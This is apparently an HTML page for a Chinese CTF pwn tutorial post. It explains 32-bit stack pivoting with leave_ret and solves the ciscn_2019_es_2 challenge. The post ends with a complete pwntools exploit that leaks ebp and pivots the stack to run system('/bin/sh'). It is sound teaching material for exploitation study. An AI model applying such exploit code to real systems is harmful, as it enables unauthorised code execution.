@@ -1,0 +1,342 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PWN从入门到放弃(12)——栈溢出之栈迁移 | 山深有杏&#39;s Blog</title>
+<link rel="shortcut icon" href="https://ssyxsec.com/favicon.ico?v=1735101861265">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ssyxsec.com/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="PWN从入门到放弃(12)——栈溢出之栈迁移 | 山深有杏&#39;s Blog - Atom Feed" href="https://ssyxsec.com/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x00 什么是栈迁移
+栈迁移主要是为了解决栈溢出空间大小不足的问题
+简单的说：就是通过修改ebp指针来修改栈帧的位置和大小
+0x01 栈迁移的实现
+通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget..." />
+    <meta name="keywords" content="CTF,Pwn" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ssyxsec.com">
+  <img class="avatar" src="https://ssyxsec.com/images/avatar.png?v=1735101861265" alt="">
+  </a>
+  <h1 class="site-title">
+    山深有杏&#39;s Blog
+  </h1>
+  <p class="site-description">
+    These Violent Delights Have Violent Ends.
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://ssyxsec.com/0mQfqrf6-n" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              PWN从入门到放弃(12)——栈溢出之栈迁移
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-11-07
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://ssyxsec.com/tag/mFiLVoNunh/" class="post-tag">
+                  # CTF
+                </a>
+              
+                <a href="https://ssyxsec.com/tag/BcBYBpcwgI/" class="post-tag">
+                  # Pwn
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h3 id="0x00-什么是栈迁移">0x00 什么是栈迁移</h3>
+<p>栈迁移主要是为了解决栈溢出空间大小不足的问题</p>
+<p>简单的说：就是通过修改ebp指针来修改栈帧的位置和大小</p>
+<h3 id="0x01-栈迁移的实现">0x01 栈迁移的实现</h3>
+<p>通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。</p>
+<h4 id="什么是leave_ret">什么是leave_ret</h4>
+<p>终端输入下面这行命令，就可以看到gadget</p>
+<pre><code class="language-javascript">$ ROPgadget --binary ciscn_2019_es_2
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://ssyxsec.com/post-images/1730960047319.png" alt="" loading="lazy"></figure>
+<p>leave：</p>
+<pre><code class="language-javascript">mov esp,ebp;
+pop ebp;
+</code></pre>
+<p>ret：</p>
+<pre><code class="language-javascript">pop eip
+</code></pre>
+<p>假如，有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这个样子：</p>
+<p>当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入</p>
+<figure data-type="image" tabindex="2"><img src="https://ssyxsec.com/post-images/1730960054607.png" alt="" loading="lazy"></figure>
+<p>在程序call调用之后，会存在这样的指令</p>
+<pre><code class="language-javascript">mov esp,ebp
+pop ebp
+ret
+</code></pre>
+<p>当我们挨个去执行的时候会出现这样的情况</p>
+<p>首先是 mov esp,ebp 执行完以后变成了这个样子：</p>
+<figure data-type="image" tabindex="3"><img src="https://ssyxsec.com/post-images/1730960062444.png" alt="" loading="lazy"></figure>
+<p>然后 pop ebp 执行完后就是</p>
+<p>别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的减一个单位</p>
+<figure data-type="image" tabindex="4"><img src="https://ssyxsec.com/post-images/1730960069188.png" alt="" loading="lazy"></figure>
+<p>这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 fake ebp1 的地址处</p>
+<p>构造的内容主要是把 fake ebp1 处写成 fake ebp2 的地址</p>
+<figure data-type="image" tabindex="5"><img src="https://ssyxsec.com/post-images/1730960087213.png" alt="" loading="lazy"></figure>
+<p>read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样</p>
+<p>首先是 mov esp,ebp 执行完成后效果如下：</p>
+<figure data-type="image" tabindex="6"><img src="https://ssyxsec.com/post-images/1730960092982.png" alt="" loading="lazy"></figure>
+<p>然后是 pop ebp，执行完成后：</p>
+<figure data-type="image" tabindex="7"><img src="https://ssyxsec.com/post-images/1730960099173.png" alt="" loading="lazy"></figure>
+<p>此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数</p>
+<p>这样我们就成功的将栈迁移到了bss段</p>
+<h3 id="0x02-例题">0x02 例题</h3>
+<h4 id="1查看程序信息">1）查看程序信息</h4>
+<p>国际惯例</p>
+<pre><code class="language-javascript">$ checksec ./ciscn_2019_es_2
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ssyxsec.com/post-images/1730960109737.png" alt="" loading="lazy"></figure>
+<p>32位程序，开启NX保护</p>
+<h4 id="2ida-pro分析">2）IDA pro分析</h4>
+<p>程序拖到ida里分析</p>
+<figure data-type="image" tabindex="9"><img src="https://ssyxsec.com/post-images/1730960115284.png" alt="" loading="lazy"></figure>
+<p>看到vul()函数，直接跟进</p>
+<figure data-type="image" tabindex="10"><img src="https://ssyxsec.com/post-images/1730960120841.png" alt="" loading="lazy"></figure>
+<p>看到程序获取我们两次输入，都是获取输入到s变量中</p>
+<p>但是s的大小只有0x28，read可以让我们输入0x30，存在溢出</p>
+<p>但是只能溢出8个字节，刚刚好覆盖ebp和返回地址</p>
+<figure data-type="image" tabindex="11"><img src="https://ssyxsec.com/post-images/1730960126199.png" alt="" loading="lazy"></figure>
+<p>在ida中看到一个hack()函数，但是点开一看，啥用没有</p>
+<p>没有可以直接返回shell的函数，而且溢出的长度太短，不够我们写rop链</p>
+<p>那么就只能用到栈迁移啦</p>
+<h4 id="3解题思路">3）解题思路</h4>
+<p>printf会将s打印出来，如果我们正好输入0x28个字节，那么printf会把后面的ebp的值也打印出来，这就泄漏了ebp，我们就可以根据相应的偏移来定位栈的位置。</p>
+<p>首先先泄漏ebp</p>
+<pre><code class="language-javascript">pay = 'a' * 0x27 + 'b'
+r.send(pay)
+r.recvuntil('b')
+ebp_addr = u32(r.recv(4))
+print 'ebp_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(ebp_addr)
+</code></pre>
+<p>泄漏出ebp的值后，我们还需要计算一下相对的偏移</p>
+<p>这个便宜点是，我们开始输入的地方，到ebp的偏移，用gdb动态调试一下</p>
+<pre><code class="language-javascript">$ gdb ./ciscn_2019_es_2
+</code></pre>
+<p>先输入r运行，然后ctrl + c中断一下，再ni单步即可</p>
+<figure data-type="image" tabindex="12"><img src="https://ssyxsec.com/post-images/1730960134759.png" alt="" loading="lazy"></figure>
+<p>这里我们随便输入四个a</p>
+<p>直接看寄存器窗口</p>
+<figure data-type="image" tabindex="13"><img src="https://ssyxsec.com/post-images/1730960141503.png" alt="" loading="lazy"></figure>
+<p>ebp的值为<code>0xffffd3f8</code>，而我们输入的位置地址为<code>0xffffd3c0</code></p>
+<p>那么偏移就是<code>0xffffd3f8 - 0xffffd3c0 = 0x38</code></p>
+<p>知道了偏移和ebp，那么我们就可以算出输入的起始地址<code>s_addr = ebp_addr - 0x38</code></p>
+<p>接下来我们就可以构造payload了</p>
+<figure data-type="image" tabindex="14"><img src="https://ssyxsec.com/post-images/1730960148645.png" alt="" loading="lazy"></figure>
+<p>我们来分析一下这个payload</p>
+<p>首先这个函数vuln结束时本来就要leave_ret</p>
+<p>这时esp指向fake ebp的地址，pop ebp时将fake_ebp的值取出，所以ebp此时指向fake_ebp即s_addr</p>
+<p>然后再leave_ret，此时esp指向ebp即s的地址，ebp的地址已经无所谓了，所以s的前4个字节无所谓，可以随便填，此时esp指向system，ebp管他呢</p>
+<p>然后执行ret 即pop eip  所以下一步要执行system函数</p>
+<p>这里的bin_sh_addr是需要我们根据输入的长度来计算的，也就是<code>s_addr + 0x10</code></p>
+<h4 id="4完整exp">4）完整exp</h4>
+<pre><code class="language-javascript"># -*- coding: utf-8 -*-
+from pwn import *
+pro = './ciscn_2019_es_2'
+context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]
+elf = ELF(pro)
+r = process(pro)
+#r = remote('node3.buuoj.cn',27480)
+context.os = 'linux'
+context.arch = elf.arch
+context.log_level = 'debug'
+
+rv = lambda x:r.recv(x)
+ru = lambda x:r.recvuntil(x)
+rud = lambda x:r.recvuntil(x,drop=True)
+rl = lambda x:r.recvline()
+sd = lambda x:r.send(x)
+sl = lambda x:r.sendline(x)
+sa = lambda x,y:r.sendafter(x,y)
+sla = lambda x,y:r.sendlineafter(x,y)
+
+if args.G:
+    gdb.attach(proc.pidof(r)[0])
+
+leave_ret = 0x080484b8
+system_addr = elf.plt['system']
+main_addr = elf.symbols['main']
+
+pay = 'a' * 0x27
+pay += 'b'
+ru('name?')
+sd(pay)
+ru('b')
+
+ebp_addr = u32(rv(4))
+print 'ebp_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(ebp_addr)
+s_addr = ebp_addr - 0x38
+print 's_addr &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; ' + hex(s_addr)
+bin_sh_addr = s_addr + 0x10
+
+pay1 = 'aaaa'
+pay1 += p32(system_addr)
+pay1 += p32(0xdeadbeef)
+pay1 += p32(bin_sh_addr)
+pay1 += '/bin/sh\x00'
+pay1 = pay1.ljust(0x28,'\x00')
+pay1 += p32(s_addr)
+pay1 += p32(leave_ret)
+
+sd(pay1)
+
+r.interactive()
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E8%BF%81%E7%A7%BB">0x00 什么是栈迁移</a></li>
+<li><a href="#0x01-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E7%8E%B0">0x01 栈迁移的实现</a>
+<ul>
+<li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFleave_ret">什么是leave_ret</a></li>
+</ul>
+</li>
+<li><a href="#0x02-%E4%BE%8B%E9%A2%98">0x02 例题</a>
+<ul>
+<li><a href="#1%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E4%BF%A1%E6%81%AF">1）查看程序信息</a></li>
+<li><a href="#2ida-pro%E5%88%86%E6%9E%90">2）IDA pro分析</a></li>
+<li><a href="#3%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">3）解题思路</a></li>
+<li><a href="#4%E5%AE%8C%E6%95%B4exp">4）完整exp</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ssyxsec.com/zwzoW6mzqS/">
+              <h3 class="post-title">
+                PWN从入门到放弃(11)——栈溢出之rop
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ssyxsec.com/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
